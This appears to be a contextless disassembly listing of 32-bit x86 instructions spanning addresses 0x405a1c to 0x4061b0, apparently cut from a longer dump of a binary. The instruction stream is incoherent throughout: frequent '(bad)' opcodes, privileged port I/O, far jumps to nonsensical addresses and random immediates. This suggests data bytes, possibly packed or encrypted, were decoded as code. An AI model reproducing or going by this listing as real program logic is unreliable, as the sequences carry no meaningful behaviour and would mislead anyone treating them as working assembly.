  405a1c:	cld    
  405a1d:	cdq    
  405a1e:	jmp    0x4059fd
  405a20:	scas   eax,DWORD PTR es:[edi]
  405a21:	pusha  
  405a22:	jge    0x405a74
  405a24:	int3   
  405a25:	call   0xe125a376
  405a2a:	push   esp
  405a2b:	sbb    BYTE PTR [ebx+0x31],ah
  405a2e:	test   ecx,edi
  405a30:	neg    DWORD PTR [esp+ebp*4]
  405a33:	cs pop es
  405a35:	push   ebp
  405a36:	outs   dx,BYTE PTR ds:[esi]
  405a37:	inc    esi
  405a38:	(bad)  
  405a39:	jae    0x4059ca
  405a3b:	dec    edx
  405a3c:	or     ah,al
  405a3e:	imul   eax,edi,0x448b2887
  405a44:	pop    esi
  405a45:	push   esi
  405a46:	mov    WORD PTR [ebp-0xc],ss
  405a49:	mov    edx,0x2365c606
  405a4e:	push   0xcac83254
  405a53:	test   eax,0x7dc524ea
  405a58:	push   ecx
  405a59:	mov    ch,0xaf
  405a5b:	loopne 0x405a87
  405a5d:	push   0xffffff8f
  405a5f:	sbb    ecx,eax
  405a61:	add    BYTE PTR [ebx+edi*2+0x5aa59bef],bh
  405a68:	mov    edx,DWORD PTR [ecx]
  405a6a:	mov    dl,0xe7
  405a6c:	lods   eax,DWORD PTR ds:[esi]
  405a6d:	sub    esp,DWORD PTR [edi-0x26]
  405a70:	dec    esp
  405a71:	pop    edi
  405a72:	mov    al,0xf9
  405a74:	mov    WORD PTR [ebx+0x26],cs
  405a77:	aam    0xd6
  405a79:	dec    ebp
  405a7a:	sbb    dh,BYTE PTR [esp+edi*1-0x6e]
  405a7e:	sub    BYTE PTR [edi+esi*2+0x51],0xfc
  405a83:	push   ecx
  405a84:	(bad)  
  405a85:	test   al,0x8
  405a87:	(bad)  
  405a88:	pop    ss
  405a89:	or     BYTE PTR [ebx-0x6f],cl
  405a8c:	sub    cl,BYTE PTR [ebx+0x40]
  405a8f:	int    0xd7
  405a91:	lods   eax,DWORD PTR ds:[esi]
  405a92:	dec    esp
  405a93:	pop    eax
  405a94:	ja     0x405a67
  405a96:	gs xor eax,0x5281664d
  405a9c:	ror    BYTE PTR [edi-0x20],cl
  405a9f:	cmp    eax,0x36d7cde2
  405aa4:	add    edi,DWORD PTR [eax+0x62492f23]
  405aaa:	stos   DWORD PTR es:[edi],eax
  405aab:	jno    0x405a67
  405aad:	(bad)  
  405aae:	mov    bl,0xfc
  405ab0:	add    ecx,esp
  405ab2:	sbb    eax,0xa1de557e
  405ab7:	pop    ss
  405ab8:	in     al,0x3a
  405aba:	pop    esi
  405abb:	cmp    DWORD PTR [ecx],ecx
  405abd:	(bad)  
  405abe:	adc    eax,0x32dfbcbe
  405ac3:	popf   
  405ac4:	scas   eax,DWORD PTR es:[edi]
  405ac5:	xor    DWORD PTR [esi-0xd0ae125],edi
  405acb:	push   es
  405acc:	ja     0x405a62
  405ace:	sub    BYTE PTR [ecx-0x3e9d94aa],bh
  405ad4:	push   esp
  405ad5:	pop    ebp
  405ad6:	lods   eax,DWORD PTR ds:[esi]
  405ad7:	mov    ah,0x24
  405ad9:	cmc    
  405ada:	outs   dx,BYTE PTR ds:[esi]
  405adb:	(bad)  
  405adc:	shr    BYTE PTR [eax-0x2681130e],1
  405ae2:	js     0x405ad1
  405ae4:	popf   
  405ae5:	push   ebx
  405ae6:	(bad)  
  405ae7:	daa    
  405ae8:	push   ebx
  405ae9:	mov    eax,0xf327ad92
  405aee:	cwde   
  405aef:	sbb    ch,BYTE PTR [ecx]
  405af1:	outs   dx,DWORD PTR ds:[esi]
  405af2:	add    al,0x8
  405af4:	pop    ebp
  405af5:	stc    
  405af6:	pop    edx
  405af7:	ss sub eax,0x55154f00
  405afd:	jmp    0x405b52
  405aff:	mov    eax,ds:0x44ddf817
  405b04:	push   ss
  405b05:	jno    0x405ac9
  405b07:	ret    0x31dd
  405b0a:	and    edx,DWORD PTR [eax+ebp*1+0x20]
  405b0e:	push   0x33a629a7
  405b13:	jmp    0x405b4a
  405b15:	xchg   edx,eax
  405b16:	jns    0x405b43
  405b18:	or     cl,0x1d
  405b1b:	mov    ebp,0x5855856c
  405b20:	inc    ecx
  405b21:	cld    
  405b22:	push   esi
  405b23:	or     dh,al
  405b25:	(bad)  
  405b26:	adc    al,0xe2
  405b28:	aas    
  405b29:	push   ds
  405b2a:	xchg   BYTE PTR [eax],dl
  405b2c:	xchg   edi,eax
  405b2d:	and    bh,BYTE PTR [ebp+ebx*8+0x32f08ced]
  405b34:	and    al,BYTE PTR [edi-0x7a]
  405b37:	ret    
  405b38:	xchg   ecx,eax
  405b39:	add    eax,0x5e82cab7
  405b3e:	das    
  405b3f:	jae    0x405ad7
  405b41:	pop    ss
  405b42:	ins    BYTE PTR es:[edi],dx
  405b43:	cmp    ch,BYTE PTR [edx+esi*4-0x2c03c394]
  405b4a:	add    eax,0x135d7cf
  405b4f:	push   esp
  405b50:	inc    ecx
  405b51:	gs add esi,esi
  405b54:	hlt    
  405b55:	inc    esp
  405b56:	data16 cmp BYTE PTR [esi-0x33],ch
  405b5a:	loope  0x405af8
  405b5c:	xchg   BYTE PTR [eax-0x64],bl
  405b5f:	dec    ecx
  405b60:	jmp    0x405bda
  405b62:	sub    ah,BYTE PTR [ebx-0x57]
  405b65:	out    0xae,al
  405b67:	je     0x405b33
  405b69:	rol    BYTE PTR [eax],cl
  405b6b:	mov    ebp,0x79b0798f
  405b70:	call   0xe06b6194
  405b75:	or     BYTE PTR [ebp+edx*4-0x5f205209],ch
  405b7c:	add    esi,DWORD PTR [eax]
  405b7e:	push   esi
  405b7f:	add    DWORD PTR [eax],ecx
  405b81:	push   ss
  405b82:	or     al,bl
  405b84:	leave  
  405b85:	mov    dh,BYTE PTR [eax+0x67]
  405b88:	jns    0x405bf7
  405b8a:	daa    
  405b8b:	ins    BYTE PTR es:[edi],dx
  405b8c:	dec    eax
  405b8d:	jmp    0x405b10
  405b8f:	xchg   ebp,eax
  405b90:	jp     0x405b5b
  405b92:	(bad)  
  405b93:	mov    dh,0x52
  405b95:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405b96:	xchg   ebx,eax
  405b97:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405b98:	pop    eax
  405b99:	dec    ebp
  405b9a:	mov    ecx,0x98db5283
  405b9f:	sbb    dl,BYTE PTR [eax]
  405ba1:	aam    0xf3
  405ba3:	retf   
  405ba4:	loope  0x405bca
  405ba6:	cwde   
  405ba7:	mov    eax,ss
  405ba9:	lea    esi,[esi+edx*8-0x32]
  405bad:	lock enter 0xb42e,0xf5
  405bb2:	push   edi
  405bb3:	mov    dl,0x6a
  405bb5:	mov    ebp,0x7d687f3b
  405bba:	jl     0x405b3f
  405bbc:	dec    ebp
  405bbd:	fcomp  DWORD PTR ds:0xa7e3d732
  405bc3:	push   esi
  405bc4:	out    0x42,eax
  405bc6:	popa   
  405bc7:	xchg   edi,eax
  405bc8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405bc9:	pusha  
  405bca:	fidiv  DWORD PTR [eax-0x215a1d23]
  405bd0:	enter  0xcd4a,0xd6
  405bd4:	sub    BYTE PTR [edi-0x75],ch
  405bd7:	mov    ch,BYTE PTR [edi]
  405bd9:	mov    al,0x7c
  405bdb:	inc    ebx
  405bdc:	jne    0x405c00
  405bde:	xchg   edi,eax
  405bdf:	das    
  405be0:	in     al,0x90
  405be2:	(bad)  
  405be3:	push   eax
  405be4:	xor    al,0x47
  405be6:	and    eax,0x7b88e276
  405beb:	out    0xf0,eax
  405bed:	dec    esp
  405bee:	fistp  WORD PTR [eax+edx*1-0x9]
  405bf2:	jbe    0x405c4a
  405bf4:	loope  0x405bb1
  405bf6:	test   al,0x25
  405bf8:	mov    eax,ds:0x6e39471a
  405bfd:	dec    edi
  405bfe:	cmp    eax,0xf7f2ceb9
  405c03:	mov    ecx,0x1689e98b
  405c08:	inc    edi
  405c09:	lea    edx,[ebx+ebx*2-0x653c6842]
  405c10:	cmp    BYTE PTR [esi-0x31164d98],dh
  405c16:	pusha  
  405c17:	popf   
  405c18:	fisttp QWORD PTR [edi-0x2f]
  405c1b:	in     eax,dx
  405c1c:	and    eax,ecx
  405c1e:	cs call 0x3f63cb38
  405c24:	jmp    0xedbadac4
  405c29:	mov    ah,0x52
  405c2b:	xor    BYTE PTR [esp+ecx*8-0x2e9ed33f],ch
  405c32:	jmp    0xf9909bb3
  405c37:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405c38:	jmp    0x405c55
  405c3a:	push   ds
  405c3b:	hlt    
  405c3c:	in     al,dx
  405c3d:	adc    BYTE PTR [esi+0x5b],dl
  405c40:	inc    eax
  405c41:	(bad)  
  405c43:	mov    al,ds:0xa0e6f2f3
  405c48:	add    ecx,DWORD PTR [edi-0x7a]
  405c4b:	and    bl,BYTE PTR [edi]
  405c4d:	and    DWORD PTR [ebx-0x7e],edx
  405c50:	dec    edi
  405c51:	pop    ebp
  405c52:	xchg   DWORD PTR [ebp-0x28],ebp
  405c55:	mov    eax,ds:0xc7b48968
  405c5a:	pop    edx
  405c5b:	mov    al,ds:0x54c6bc4f
  405c60:	add    DWORD PTR [edx-0x20],edx
  405c63:	in     eax,0x96
  405c65:	ins    DWORD PTR es:[edi],dx
  405c66:	inc    edi
  405c67:	mov    dl,0x59
  405c69:	js     0x405c1d
  405c6b:	xchg   BYTE PTR [edi+edi*4],cl
  405c6e:	push   ecx
  405c6f:	mov    edx,0xa3021cef
  405c74:	xchg   ebx,eax
  405c75:	mov    BYTE PTR [esi-0x109a7a66],al
  405c7b:	add    BYTE PTR [esi],dl
  405c7d:	jge    0x405c5b
  405c7f:	adc    BYTE PTR [esi-0x16],al
  405c82:	push   edi
  405c83:	pop    edi
  405c84:	mov    ecx,0xea2162e1
  405c89:	iret   
  405c8a:	test   BYTE PTR [ecx],dl
  405c8c:	jle    0x405c47
  405c8e:	or     BYTE PTR [eax+0x65],al
  405c91:	mov    ebx,0x9fce35d9
  405c96:	jl     0x405c76
  405c98:	fwait
  405c99:	cli    
  405c9a:	sti    
  405c9b:	pop    ecx
  405c9c:	inc    ecx
  405c9d:	ret    
  405c9e:	xchg   DWORD PTR [edi],ebp
  405ca0:	xchg   BYTE PTR [ecx],dl
  405ca2:	add    ch,BYTE PTR [esi+0x66]
  405ca5:	int    0xbf
  405ca7:	xchg   BYTE PTR [eax-0x22d98963],cl
  405cad:	jns    0x405ca6
  405caf:	test   al,0xe2
  405cb1:	xor    cl,BYTE PTR [ecx]
  405cb3:	stos   DWORD PTR es:[edi],eax
  405cb4:	jae    0x405d0d
  405cb6:	sar    DWORD PTR ds:0x8dbb7440,1
  405cbc:	(bad)  
  405cbd:	popa   
  405cbe:	(bad)  
  405cbf:	stos   DWORD PTR es:[edi],eax
  405cc0:	mov    ebx,0xec8c708b
  405cc5:	xchg   esi,eax
  405cc6:	push   es
  405cc7:	cdq    
  405cc8:	jnp    0x405d02
  405cca:	adc    DWORD PTR [edi-0x55],edx
  405ccd:	sbb    DWORD PTR [esi],0xffffff91
  405cd0:	adc    eax,0xae123ef4
  405cd5:	mov    esp,0x7fc88c8b
  405cda:	jmp    0x405c67
  405cdc:	out    0x5c,al
  405cde:	or     ah,al
  405ce0:	pop    ss
  405ce1:	mov    ebx,0x4fb4914b
  405ce6:	in     al,0x3c
  405ce8:	adc    BYTE PTR es:[ebx],al
  405ceb:	xchg   esp,edi
  405ced:	mov    edi,0x61b4e9e8
  405cf2:	inc    esi
  405cf3:	sub    bh,BYTE PTR [eax]
  405cf5:	jmp    0x5578:0xfbf777ed
  405cfc:	cld    
  405cfd:	xchg   BYTE PTR [edx-0x29],cl
  405d00:	mov    ebp,0x4205ba25
  405d05:	fisub  WORD PTR [ebp+0x65]
  405d08:	and    edi,DWORD PTR [edx+0x63]
  405d0b:	in     al,dx
  405d0c:	mov    bl,0xa8
  405d0e:	loope  0x405cfb
  405d10:	xor    eax,0xa3d0c385
  405d15:	sahf   
  405d16:	(bad)  
  405d18:	out    dx,al
  405d19:	inc    eax
  405d1a:	dec    eax
  405d1b:	in     al,dx
  405d1c:	and    bh,dh
  405d1e:	clc    
  405d1f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405d20:	mov    al,ds:0x356fa680
  405d25:	add    BYTE PTR [edi-0x20b9d000],al
  405d2b:	pop    ebp
  405d2c:	fidiv  DWORD PTR [edi+0x766d381b]
  405d32:	ins    DWORD PTR es:[edi],dx
  405d33:	pop    ds
  405d34:	push   0x4a2b8a66
  405d39:	inc    edx
  405d3a:	outs   dx,DWORD PTR ds:[esi]
  405d3b:	lea    eax,[esi]
  405d3d:	out    dx,eax
  405d3e:	(bad)  
  405d3f:	jnp    0x405cce
  405d41:	(bad)  
  405d42:	mov    DWORD PTR [ecx-0x29],edi
  405d45:	push   cs
  405d46:	xor    ah,BYTE PTR [edi+0xb2906f]
  405d4c:	pop    ecx
  405d4d:	or     DWORD PTR [ebp-0x1f4194a],0x51
  405d54:	mov    bh,0x87
  405d56:	test   DWORD PTR [ebx+edi*2],esi
  405d59:	ret    0x4d80
  405d5c:	es push 0xb11238f7
  405d62:	cmc    
  405d63:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405d64:	stos   DWORD PTR es:[edi],eax
  405d65:	(bad)  
  405d66:	daa    
  405d67:	hlt    
  405d68:	imul   esp,DWORD PTR [edi+0x70],0xc7e6e253
  405d6f:	out    dx,al
  405d70:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405d71:	xchg   esp,eax
  405d72:	fnstcw WORD PTR [eax-0x7ce12fa3]
  405d78:	scas   eax,DWORD PTR es:[edi]
  405d79:	dec    ecx
  405d7a:	adc    DWORD PTR [ebp-0x7b],0xffffff8d
  405d7e:	mov    DWORD PTR [ecx+0x55],esi
  405d81:	pop    ebp
  405d82:	fst    QWORD PTR [ebx+0xb]
  405d85:	call   0xa992e911
  405d8a:	out    0x5c,eax
  405d8c:	cmp    BYTE PTR [edx],dh
  405d8e:	jl     0x405dc2
  405d90:	add    BYTE PTR [edx],cl
  405d92:	add    BYTE PTR [ecx-0x24],0xef
  405d96:	xor    al,0xa0
  405d98:	xor    ebp,esp
  405d9a:	loop   0x405e10
  405d9c:	shr    BYTE PTR [eax+0x44],cl
  405d9f:	dec    ecx
  405da0:	(bad)  
  405da1:	icebp  
  405da2:	das    
  405da3:	sub    ch,BYTE PTR [esi+0x53]
  405da6:	aad    0xa2
  405da8:	mov    fs,esi
  405daa:	loop   0x405d71
  405dac:	js     0x405e10
  405dae:	mov    dl,0x6c
  405db0:	in     eax,dx
  405db1:	loop   0x405d3b
  405db3:	lahf   
  405db4:	lods   eax,DWORD PTR ds:[esi]
  405db5:	sub    edx,eax
  405db7:	cmp    eax,DWORD PTR [esi+ecx*8+0x3c]
  405dbb:	push   ds
  405dbc:	scas   eax,DWORD PTR es:[edi]
  405dbd:	mov    edx,0x85d1a3cc
  405dc2:	imul   esp,esi,0x8b53e892
  405dc8:	or     ecx,DWORD PTR [edi-0x1f]
  405dcb:	sbb    al,0x10
  405dcd:	dec    esi
  405dce:	and    bh,bl
  405dd0:	sbb    al,0xa9
  405dd2:	pop    eax
  405dd3:	mov    esi,DWORD PTR ds:0x42e0e6d2
  405dd9:	adc    ah,ch
  405ddb:	mov    esi,0xc5ba233c
  405de0:	test   eax,0x55329dd9
  405de5:	xchg   BYTE PTR [bp+si],dh
  405de8:	sub    bl,BYTE PTR [ebp+0x63b3feb]
  405dee:	pop    eax
  405def:	fwait
  405df0:	or     BYTE PTR [ebx-0x6],dh
  405df3:	pop    edi
  405df4:	xchg   edx,eax
  405df5:	iret   
  405df6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405df7:	clc    
  405df8:	xor    edx,DWORD PTR [eax+0x40]
  405dfb:	nop
  405dfc:	mov    ch,0x65
  405dfe:	cli    
  405dff:	cmp    esp,eax
  405e01:	cmc    
  405e02:	dec    ecx
  405e03:	sbb    BYTE PTR [ebp+0x1ace4231],bh
  405e09:	xor    DWORD PTR [edx],esp
  405e0b:	sbb    bh,BYTE PTR [eax-0x76406f4]
  405e11:	std    
  405e12:	push   ebx
  405e13:	out    0xea,eax
  405e15:	ror    DWORD PTR [ebx+0x7a9487c0],0x65
  405e1c:	je     0x405e82
  405e1e:	mov    al,0xa5
  405e20:	fisubr DWORD PTR [eax-0x1b]
  405e23:	in     al,0xf0
  405e25:	xchg   ebp,eax
  405e26:	lods   eax,DWORD PTR ds:[esi]
  405e27:	inc    eax
  405e28:	sub    DWORD PTR [ecx+0x4204edbc],esp
  405e2e:	mov    cl,0xdf
  405e30:	jmp    0xf0c773d8
  405e35:	dec    edi
  405e36:	jne    0x405e65
  405e38:	sub    edi,0xfffffff7
  405e3b:	inc    esp
  405e3c:	fiadd  DWORD PTR ds:0xa13da18d
  405e42:	sbb    edi,DWORD PTR [esi+ebp*2]
  405e45:	lods   eax,DWORD PTR ds:[esi]
  405e46:	neg    DWORD PTR [esi]
  405e48:	int3   
  405e49:	mov    dl,0x97
  405e4b:	xchg   bp,ax
  405e4d:	cs stc 
  405e4f:	push   ebp
  405e50:	test   eax,0xc1952c98
  405e55:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405e56:	xchg   ecx,eax
  405e57:	test   eax,esi
  405e59:	dec    esp
  405e5a:	jle    0x405e8e
  405e5c:	dec    ebp
  405e5d:	mov    ds:0xee3dcc3f,al
  405e62:	repz pop esi
  405e64:	xchg   esi,eax
  405e65:	pusha  
  405e66:	(bad)  
  405e67:	popf   
  405e68:	push   0x775620ee
  405e6d:	retf   0x58f9
  405e70:	dec    eax
  405e71:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405e72:	shl    DWORD PTR gs:[ecx-0xb29a7cd],1
  405e79:	jg     0x405e3c
  405e7b:	iret   
  405e7c:	adc    al,0x4d
  405e7e:	prefetcht1 BYTE PTR [edx+0x58]
  405e82:	mov    ds:0x2123ea55,eax
  405e87:	ins    BYTE PTR es:[edi],dx
  405e88:	dec    ecx
  405e89:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405e8a:	mov    ebx,0x7554958b
  405e8f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405e90:	call   0xdcc963b
  405e95:	dec    edx
  405e96:	fwait
  405e97:	xlat   BYTE PTR ds:[ebx]
  405e98:	and    BYTE PTR [esi],dl
  405e9a:	test   DWORD PTR [edx-0x55169c4f],edi
  405ea0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405ea1:	xlat   BYTE PTR ds:[ebx]
  405ea2:	int3   
  405ea3:	push   eax
  405ea4:	lods   eax,DWORD PTR ds:[esi]
  405ea5:	sar    DWORD PTR [ecx-0x59],1
  405ea8:	fmul   DWORD PTR [esi+ecx*4-0x32]
  405eac:	mov    ebp,0x9b543dc2
  405eb1:	loop   0x405ee5
  405eb3:	mov    esp,0x625cae89
  405eb8:	push   edi
  405eb9:	inc    edi
  405eba:	dec    ecx
  405ebb:	and    dl,dh
  405ebd:	mov    ds:0x949da7c4,eax
  405ec2:	(bad)  
  405ec3:	xlat   BYTE PTR ds:[ebx]
  405ec4:	push   ss
  405ec5:	mov    eax,DWORD PTR [ecx-0x1610d363]
  405ecb:	or     eax,0xbb9ac2d4
  405ed0:	push   esp
  405ed1:	outs   dx,DWORD PTR ds:[esi]
  405ed2:	push   ecx
  405ed3:	pop    DWORD PTR [edi+0x14]
  405ed6:	(bad)  ds:0x57ffb855
  405edc:	xor    dl,BYTE PTR [ebx+0x7b]
  405edf:	xor    dh,dh
  405ee1:	cmp    BYTE PTR [esp+esi*1+0xd],0xa9
  405ee6:	sbb    al,0xaa
  405ee8:	xchg   esi,eax
  405ee9:	in     al,0xa6
  405eeb:	fild   DWORD PTR [ebx-0x63]
  405eee:	xor    bh,BYTE PTR [edx+0x22]
  405ef1:	mov    eax,ds:0x7ba4e0df
  405ef6:	out    0x3d,eax
  405ef8:	call   0xf335:0x340afa2e
  405eff:	rcr    BYTE PTR [eax+ebp*1+0x4e958b7b],cl
  405f06:	fisubr WORD PTR [eax-0x24]
  405f09:	cld    
  405f0a:	xor    eax,0x348f4355
  405f0f:	cmc    
  405f10:	pop    edi
  405f11:	sar    BYTE PTR [esi-0x5b657c04],0x2c
  405f18:	call   0x5ad52a8a
  405f1d:	rol    BYTE PTR [edi-0x7f37ff35],cl
  405f23:	mov    edi,DWORD PTR ds:0xc3dd5daf
  405f29:	add    eax,0xd11a35a4
  405f2e:	mov    esi,0xb3db5b40
  405f33:	add    edi,edi
  405f35:	test   BYTE PTR [edi-0x1e974ccd],dh
  405f3b:	and    al,bh
  405f3d:	inc    esp
  405f3e:	add    edx,ebp
  405f40:	jne    0x405edf
  405f42:	mov    ebx,0xbddd6934
  405f47:	js     0x405f98
  405f49:	(bad)
  405f4c:	jne    0x405f07
  405f4e:	fld    st(5)
  405f50:	enter  0x5e99,0xe5
  405f54:	inc    ecx
  405f55:	bound  ebx,QWORD PTR ds:0xdf40d4d1
  405f5b:	and    BYTE PTR [edx],0xc9
  405f5e:	cmp    eax,0xf217b27b
  405f63:	(bad)  
  405f66:	mov    ebp,0xad6ac712
  405f6b:	cwde   
  405f6c:	lods   al,BYTE PTR ds:[esi]
  405f6d:	mov    ch,0xd8
  405f6f:	je     0x405fe0
  405f71:	add    al,0xa0
  405f73:	add    dl,BYTE PTR [edi+eax*1]
  405f76:	shl    DWORD PTR [eax+0x59157546],1
  405f7c:	add    BYTE PTR [esi+0x12720e00],ah
  405f82:	and    al,0x8b
  405f84:	loop   0x405f96
  405f86:	scas   eax,DWORD PTR es:[edi]
  405f87:	jo     0x405f7f
  405f89:	test   al,0x65
  405f8b:	or     eax,0x32e1bc9a
  405f90:	aas    
  405f91:	fbld   TBYTE PTR [edi]
  405f93:	(bad)  
  405f94:	dec    esp
  405f95:	ss pop edx
  405f97:	xlat   BYTE PTR ds:[ebx]
  405f98:	xlat   BYTE PTR ds:[ebx]
  405f99:	cwde   
  405f9a:	in     al,0x87
  405f9c:	leave  
  405f9d:	mov    ebx,0x8de02544
  405fa2:	sbb    bh,BYTE PTR [edx+esi*4+0x5f60e805]
  405fa9:	(bad)  
  405faa:	shl    BYTE PTR [ecx+0x6f],cl
  405fad:	fwait
  405fae:	ja     0x405fbc
  405fb0:	stc    
  405fb1:	dec    esi
  405fb2:	cwde   
  405fb3:	mov    al,0x10
  405fb5:	pop    eax
  405fb6:	push   ebx
  405fb7:	mov    bl,0xde
  405fb9:	sub    al,0x12
  405fbb:	(bad)  
  405fbc:	stc    
  405fbd:	jne    0x405feb
  405fbf:	aad    0x45
  405fc1:	je     0x405fde
  405fc3:	push   esi
  405fc4:	xor    BYTE PTR [ebx],bh
  405fc6:	(bad)  
  405fc7:	int    0x64
  405fc9:	(bad)  
  405fca:	mov    ebp,0xd0e76072
  405fcf:	sar    DWORD PTR ds:0xbe38aa85,1
  405fd5:	addr16 pop eax
  405fd7:	and    al,0x81
  405fd9:	pushf  
  405fda:	outs   dx,DWORD PTR ds:[esi]
  405fdb:	dec    ebx
  405fdc:	pop    ebx
  405fdd:	dec    esi
  405fde:	and    al,0x75
  405fe0:	or     esi,DWORD PTR [ebx-0x33ddef00]
  405fe6:	(bad)  
  405fe7:	fmul   DWORD PTR [edi-0x7a1544e3]
  405fed:	pop    ds
  405fee:	test   BYTE PTR ss:0xb97d4e81,ah
  405ff5:	adc    edi,ecx
  405ff7:	mov    WORD PTR [edx],?
  405ff9:	scas   al,BYTE PTR es:[edi]
  405ffa:	pushf  
  405ffb:	xchg   edi,eax
  405ffc:	push   cs
  405ffd:	cmp    DWORD PTR [edi+ebp*8],0xe023f064
  406004:	sub    ch,bl
  406006:	sbb    al,0xda
  406008:	add    ch,BYTE PTR [ebx+esi*2+0x785f238b]
  40600f:	mov    ds:0xaa5ca713,al
  406014:	inc    esp
  406015:	call   0x4960adcc
  40601a:	push   cs
  40601b:	pop    esi
  40601c:	je     0x405fd3
  40601e:	(bad)  
  406020:	jae    0x405fc4
  406022:	add    eax,0x8a71aa79
  406027:	xor    al,0x2b
  406029:	push   edi
  40602a:	mov    ch,0x78
  40602c:	jbe    0x405fcb
  40602e:	jecxz  0x40609b
  406030:	cli    
  406031:	mov    edi,0x59140f07
  406036:	jmp    0xd8a3:0x53272c3
  40603d:	jg     0x4060b5
  40603f:	jbe    0x40604b
  406041:	pushf  
  406042:	sub    BYTE PTR [ecx-0x48976d52],dl
  406048:	jmp    0x4060a3
  40604a:	outs   dx,DWORD PTR ds:[esi]
  40604b:	sub    DWORD PTR [bp+0x6f],0xfb460c38
  406053:	lods   al,BYTE PTR ds:[esi]
  406054:	pop    es
  406055:	mov    ?,WORD PTR [ecx+0x4495c3f9]
  40605b:	mov    WORD PTR [eax-0x43cfdcdf],gs
  406061:	mov    eax,0xa2b965ad
  406066:	sub    BYTE PTR [eax-0x4188acca],ch
  40606c:	jbe    0x406000
  40606e:	jp     0x4060cc
  406070:	or     bl,BYTE PTR [eax-0x4d]
  406073:	stc    
  406074:	std    
  406075:	dec    edx
  406076:	cs leave 
  406078:	jmp    0x8939:0x2ab32a96
  40607f:	jl     0x4060f7
  406081:	pop    edx
  406082:	mov    DWORD PTR [ecx-0x38fa79ff],esp
  406088:	call   DWORD PTR [esp+eiz*2+0x333dfe57]
  40608f:	sbb    eax,0xbe914e1e
  406094:	jmp    0x4a32:0xd3a196f7
  40609b:	add    DWORD PTR [eax+0x2f87b75d],esp
  4060a1:	lock pop ebx
  4060a3:	scas   eax,DWORD PTR es:[edi]
  4060a4:	push   edi
  4060a5:	mov    DWORD PTR [eax+0x4d518b1],ebp
  4060ab:	ds not edx
  4060ae:	xlat   BYTE PTR ds:[ebx]
  4060af:	mov    ch,bh
  4060b1:	adc    DWORD PTR [esp+edi*2-0x12],esp
  4060b5:	sahf   
  4060b6:	inc    esp
  4060b7:	imul   edi,DWORD PTR [ecx],0x1
  4060ba:	sub    ebx,DWORD PTR [esi]
  4060bc:	pushf  
  4060bd:	add    ecx,DWORD PTR [ebp+0x6b]
  4060c0:	inc    esi
  4060c1:	ins    DWORD PTR es:[edi],dx
  4060c2:	push   ebp
  4060c3:	xchg   esi,eax
  4060c4:	inc    esp
  4060c5:	(bad)  
  4060c6:	fld    TBYTE PTR [edi+0x52150534]
  4060cc:	clc    
  4060cd:	push   ecx
  4060ce:	sub    BYTE PTR [eax+0xc0b4225],0xfb
  4060d5:	jns    0x406147
  4060d7:	pop    esp
  4060d8:	or     ebp,0x45
  4060db:	xchg   DWORD PTR [edi-0x3f],eax
  4060de:	int    0x9f
  4060e0:	adc    bh,bl
  4060e2:	sahf   
  4060e3:	add    eax,0x7ad4dd52
  4060e8:	out    0x92,al
  4060ea:	retf   0xa06f
  4060ed:	xlat   BYTE PTR ds:[ebx]
  4060ee:	pop    edx
  4060ef:	jo     0x4060dd
  4060f1:	lods   eax,DWORD PTR ds:[esi]
  4060f2:	movs   DWORD PTR es:[edi],DWORD PTR ss:[esi]
  4060f4:	push   esp
  4060f5:	fcmovne st,st(3)
  4060f7:	rol    BYTE PTR [edi+ebx*4],1
  4060fa:	cwde   
  4060fb:	in     eax,dx
  4060fc:	adc    eax,0x39ac3ce6
  406101:	icebp  
  406102:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406103:	shr    BYTE PTR [ecx-0xb4fd2b4],0x9a
  40610a:	out    dx,al
  40610b:	lds    edx,FWORD PTR [ecx+0xdfd4163]
  406111:	and    BYTE PTR [ecx+0x23307c91],bh
  406117:	push   es
  406118:	jmp    0x8051:0x6a827d71
  40611f:	mov    dl,0xa1
  406121:	sub    bh,BYTE PTR [ecx+0x6]
  406124:	nop
  406125:	cmp    edi,DWORD PTR [ecx+0x55]
  406128:	jl     0x406162
  40612a:	add    al,0xce
  40612c:	and    ch,0xaa
  40612f:	dec    edi
  406130:	mov    bh,0x1f
  406132:	call   0x87a1:0xf2f1a669
  406139:	scas   eax,DWORD PTR es:[edi]
  40613a:	lods   al,BYTE PTR ds:[esi]
  40613b:	push   ebx
  40613c:	ds or  eax,0x56c427a5
  406142:	test   DWORD PTR [ebx+0x2e2ac7ea],ebx
  406148:	sahf   
  406149:	(bad)  
  40614a:	in     al,0x97
  40614c:	mov    ch,0x86
  40614e:	and    ebp,0xffffff89
  406151:	retf   
  406152:	sub    al,0xc1
  406154:	jns    0x406178
  406156:	std    
  406157:	sub    DWORD PTR es:[edi],ecx
  40615a:	or     ecx,DWORD PTR [ebp-0x3d634383]
  406160:	cmp    al,0xbc
  406162:	pop    ebx
  406163:	push   esp
  406164:	fcmovne st,st(5)
  406166:	aad    0x98
  406168:	imul   edx,DWORD PTR ds:0x10992f29,0x43
  40616f:	cwde   
  406170:	out    0x13,eax
  406172:	push   ebx
  406173:	ja     0x406133
  406175:	test   DWORD PTR [ebx+0x2f],edi
  406178:	cmp    DWORD PTR [edx+0x32a4f0d5],edx
  40617e:	int3   
  40617f:	sti    
  406180:	rcl    DWORD PTR [edx+edx*1-0x56],1
  406184:	cld    
  406185:	mov    ds:0xc1350887,al
  40618a:	mov    ah,bh
  40618c:	fnstsw WORD PTR ds:0x59e9fc7a
  406192:	jp     0x406129
  406194:	inc    edi
  406195:	(bad)  
  406196:	sub    al,0xe9
  406198:	fist   DWORD PTR ds:0xb6ba9519
  40619e:	dec    esp
  40619f:	sti    
  4061a0:	xor    esp,DWORD PTR [ebx+ebx*2+0x7344e97]
  4061a7:	imul   esp,ebx,0xffffffa3
  4061aa:	imul   ecx,DWORD PTR [edx],0x3dbaaaf
  4061b0:	xlat   BYTE PTR ds:[ebx]
